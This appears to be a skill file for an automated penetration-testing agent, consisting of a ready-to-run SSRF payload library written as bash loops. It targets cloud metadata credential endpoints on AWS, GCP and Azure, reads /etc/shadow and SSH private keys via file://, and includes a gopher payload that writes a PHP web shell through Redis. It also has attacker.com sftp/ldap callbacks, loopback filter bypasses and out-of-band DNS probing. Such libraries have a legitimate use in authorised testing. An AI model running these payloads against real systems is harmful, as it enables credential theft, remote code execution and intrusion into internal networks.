---
name: payload-ssrf
description: "SSRF payload collection — cloud metadata endpoints (AWS/GCP/Azure), internal port scan, protocol abuse (gopher/dict/file/sftp), bypass techniques (127.0.0.1 variants, IPv6, DNS rebinding, open redirect chains). Triggers: 'ssrf payload', 'server side request forgery payload', 'cloud metadata payload', 'gopher ssrf', 'ssrf bypass', 'aws imds payload', '169.254.169.254 payload'."
---

# SSRF Payloads

Payload library for Server-Side Request Forgery testing.

## Phase 1: Cloud Metadata Endpoints

```bash
TARGET="https://TARGET"
PARAM="url"

# AWS IMDS v1 (no auth required)
AWS_META=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
  "http://169.254.169.254/latest/user-data"
  "http://169.254.169.254/latest/dynamic/instance-identity/document"
  "http://[fd00:ec2::254]/latest/meta-data/"  # IPv6 IMDS
)

# GCP metadata
GCP_META=(
  "http://metadata.google.internal/computeMetadata/v1/"
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
)

# Azure IMDS
AZURE_META=(
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
)

for url in "${AWS_META[@]}" "${GCP_META[@]}" "${AZURE_META[@]}"; do
  result=$(curl -s "$TARGET/?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$url'))")")
  echo "$result" | grep -qi "AccessKeyId\|token\|computeMetadata\|metadata" && echo "HIT: $url"
done | tee /workspace/output/ssrf-cloud-hits.txt
```

## Phase 2: Internal Service Probing

```bash
# Common internal ports/services
INTERNAL_TARGETS=(
  "http://localhost/"
  "http://127.0.0.1/"
  "http://127.0.0.1:22/"
  "http://127.0.0.1:80/"
  "http://127.0.0.1:443/"
  "http://127.0.0.1:8080/"
  "http://127.0.0.1:8443/"
  "http://127.0.0.1:3000/"
  "http://127.0.0.1:4000/"
  "http://127.0.0.1:5000/"
  "http://127.0.0.1:6379/"      # Redis
  "http://127.0.0.1:9200/"      # Elasticsearch
  "http://127.0.0.1:27017/"     # MongoDB
  "http://127.0.0.1:11211/"     # Memcached
  "http://127.0.0.1:5601/"      # Kibana
  "http://127.0.0.1:8161/"      # ActiveMQ
  "http://10.0.0.1/"
  "http://192.168.1.1/"
  "http://internal/"
  "http://backend/"
  "http://api.internal/"
)

for url in "${INTERNAL_TARGETS[@]}"; do
  curl -s "$TARGET/?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$url'))")" | head -5
done | tee /workspace/output/ssrf-internal.txt
```

## Phase 3: Protocol Abuse Payloads

```bash
# file:// protocol
FILE_PAYLOADS=(
  "file:///etc/passwd"
  "file:///etc/shadow"
  "file:///proc/self/environ"
  "file:///root/.ssh/id_rsa"
  "file:///C:/Windows/win.ini"
)

# gopher:// (send raw TCP — can interact with Redis, Memcached, SMTP)
GOPHER_REDIS="gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2422%0D%0A%0A%0A%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2F%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2A10%0D%0Adbfilename%0D%0A%246%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A"

# dict:// (interact with Redis via DICT protocol)
DICT_PAYLOAD="dict://127.0.0.1:6379/info"

# sftp:// and ldap://
SFTP_PAYLOAD="sftp://attacker.com:11111/"
LDAP_PAYLOAD="ldap://attacker.com:389/a"

for url in "${FILE_PAYLOADS[@]}" "$DICT_PAYLOAD" "$SFTP_PAYLOAD"; do
  curl -s "$TARGET/?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$url'))")" | head -10
done | tee /workspace/output/ssrf-protocols.txt
```

## Phase 4: SSRF Bypass Techniques

```bash
# 127.0.0.1 variants
BYPASS_PAYLOADS=(
  "http://0/"                  # 0 = 0.0.0.0
  "http://0.0.0.0/"
  "http://0177.0.0.1/"         # octal
  "http://0x7f000001/"         # hex
  "http://2130706433/"         # decimal
  "http://127.1/"              # shorthand
  "http://127.0.1/"
  "http://[::1]/"              # IPv6 loopback
  "http://[::ffff:127.0.0.1]/" # IPv4-mapped
  "http://127.0.0.1.nip.io/"   # DNS resolve to 127.0.0.1
  "http://localtest.me/"        # resolves to 127.0.0.1
  "http://spoofed.burpcollaborator.net/"  # DNS rebind
  "http://127.0.0.1%40evil.com/"  # @ confusion
  "http://evil.com@127.0.0.1/"   # auth bypass
  "http://127.0.0.1#evil.com"    # fragment
)

# Open redirect chaining for SSRF
# If app has open redirect: GET /redirect?url=X → 302 Location: X
OPEN_REDIRECT_CHAIN="https://TARGET/redirect?url=http://169.254.169.254/latest/meta-data/"

for payload in "${BYPASS_PAYLOADS[@]}"; do
  result=$(curl -s "$TARGET/?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")")
  [ -n "$result" ] && echo "BYPASS HIT: $payload"
done | tee /workspace/output/ssrf-bypass.txt
```

## Phase 5: Blind SSRF via OOB

```bash
INTERACTSH="YOUR.oast.me"

# DNS OOB
curl -s "$TARGET/?$PARAM=http://$INTERACTSH/"
curl -s "$TARGET/?$PARAM=https://$INTERACTSH/"

# Unique per-parameter OOB tracking
for param in url uri callback endpoint redirect webhook target fetch; do
  subdomain="${param}.$(date +%s).$INTERACTSH"
  curl -s "$TARGET/?$param=http://$subdomain/" &
done
wait

echo "Check interactsh/Burp Collaborator for DNS/HTTP callbacks" | tee /workspace/output/ssrf-oob.txt
```

## Output

Save to `/workspace/output/`:
- `ssrf-cloud-hits.txt` — cloud metadata responses
- `ssrf-internal.txt` — internal service probes
- `ssrf-protocols.txt` — protocol abuse results
- `ssrf-bypass.txt` — filter bypass hits

## Next Phase

→ `vuln-ssrf` for full SSRF exploitation methodology
